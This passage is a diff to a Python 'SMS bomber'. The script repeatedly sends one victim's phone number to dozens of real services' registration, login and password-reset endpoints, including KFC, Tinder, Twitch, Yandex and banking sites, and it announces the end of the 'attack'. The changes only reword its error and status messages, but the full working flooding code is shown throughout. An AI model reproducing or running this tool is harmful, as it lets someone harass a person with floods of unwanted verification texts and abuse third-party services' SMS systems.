+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
@@ -3185,10 +3185,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -3197,10 +3197,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -3208,10 +3208,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -3220,10 +3220,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -3233,10 +3233,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -3245,10 +3245,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -3259,7 +3259,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -3267,10 +3267,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -3279,10 +3279,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -3291,10 +3291,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -3304,10 +3304,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -3317,10 +3317,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -3328,10 +3328,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -3341,10 +3341,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -3352,10 +3352,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -3365,10 +3365,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -3381,10 +3381,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -3392,10 +3392,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -3403,10 +3403,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -3414,10 +3414,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -3425,10 +3425,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -3437,10 +3437,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -3449,10 +3449,10 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -3461,10 +3461,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -3474,10 +3474,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -3487,10 +3487,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -3499,10 +3499,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -3510,10 +3510,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -3521,10 +3521,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -3532,10 +3532,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -3544,10 +3544,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -3557,10 +3557,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -3569,10 +3569,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -3580,10 +3580,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -3593,10 +3593,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -3604,10 +3604,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -3615,10 +3615,10 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -3629,10 +3629,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -3641,10 +3641,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -3652,10 +3652,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -3664,10 +3664,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -3675,10 +3675,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -3688,10 +3688,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -3699,10 +3699,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -3710,10 +3710,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -3723,17 +3723,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -3742,10 +3742,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -3753,10 +3753,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -3765,10 +3765,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -3778,10 +3778,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -3789,10 +3789,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -3803,7 +3803,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -3811,10 +3811,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -3823,10 +3823,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -3835,10 +3835,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -3848,10 +3848,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -3861,10 +3861,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -3872,10 +3872,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -3885,10 +3885,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -3896,10 +3896,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -3909,10 +3909,10 @@ if call == str(2):
